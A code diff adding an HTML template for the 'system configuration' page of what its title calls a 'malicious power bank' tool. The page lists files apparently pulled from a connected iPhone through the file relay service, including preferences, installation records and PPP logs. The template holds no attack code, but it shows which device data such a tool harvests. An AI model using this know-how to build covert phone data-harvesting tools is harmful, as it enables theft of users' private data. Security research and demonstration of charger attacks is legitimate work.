@@ -1,0 +1,134 @@
+{% extends "base.html" %}
+{% block meta %}
+{% end %}
+
+{% block title %}恶意充电宝－系统配置{% end %}
+
+{% block pagecss %}{% end %}
+{% block pagejs_before %}
+
+{% end %}
+
+{% block body %}
+<div id="main">
+    <div class="inner-title">
+        <span class="font-green select-phone">{{ param["cur"] }}</span> <span> &gt; </span><span class="active-nav">系统配置</span>
+    </div>
+    <div class="inner-cont">
+	    	<table class="tbl" id="dataTbl">
+		     <tbody>
+
+		     </tbody>
+		   </table>
+    </div>
+</div>
+<script type="text/html" id="dataTmpl">
+    <tr class="main-tr">
+        <td title="SystemConfiguration">filerelay/Library/Preferences/SystemConfiguration (共{=opts.records.SystemConfiguration.length}个文件)</td>
+        {if(opts.records.SystemConfiguration.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td>
+        </tr>
+        <tr class="link hide">
+	        <td colspan="2">
+	            <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.SystemConfiguration.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.SystemConfiguration[i].md5}">
+				            <td title="{=opts.records.SystemConfiguration[i].filename}">{=opts.records.SystemConfiguration[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+            <td></td></tr>
+        {/if}
+    <tr class="main-tr">
+        <td title="ppp">filerelay/var/log/ppp (共{=opts.records.ppp.length}个文件)</td>
+        {if(opts.records.ppp.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+        <tr class="link hide">
+	        <td colspan="2">
+		        <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.ppp.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.ppp[i].md5}">
+				            <td title="{=opts.records.ppp[i].filename}">{=opts.records.ppp[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+        <td></td></tr>
+        {/if}
+    <tr class="main-tr">
+        <td title="MobileInstallation">filerelay/var/mobile/Library/MobileInstallation (共{=opts.records.MobileInstallation.length}个文件)</td>
+        {if(opts.records.MobileInstallation.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+        <tr class="link hide">
+	        <td colspan="2">
+		        <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.MobileInstallation.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.MobileInstallation[i].md5}">
+				            <td title="{=opts.records.MobileInstallation[i].filename}">{=opts.records.MobileInstallation[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+        <td></td></tr>
+        {/if}
+    <tr class="main-tr">
+        <td title="Preferences">filerelay/var/mobile/Library/Preferences (共{=opts.records.Preferences.length}个文件)</td>
+        {if(opts.records.Preferences.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+        <tr class="link hide">
+	        <td colspan="2">
+		        <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.Preferences.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.Preferences[i].md5}">
+				            <td title="{=opts.records.Preferences[i].filename}">{=opts.records.Preferences[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+        <td></td></tr>
+        {/if}
+
+    <tr class="main-tr">
+        <td title="Assets">filerelay/var/mobile/Library/Assets (共{=opts.records.Assets.length}个文件)</td>
+        {if(opts.records.Assets.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+        <tr class="link hide">
+	        <td colspan="2">
+		        <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.Assets.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.Assets[i].md5}">
+				            <td title="{=opts.records.Assets[i].filename}">{=opts.records.Assets[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+        <td></td></tr>
+        {/if}
+    
+</script>
+{% end %}
+
+{% block pagejs %}
+ <script src="/static/js/page/config.js" type="text/javascript"></script>
+{% end %}
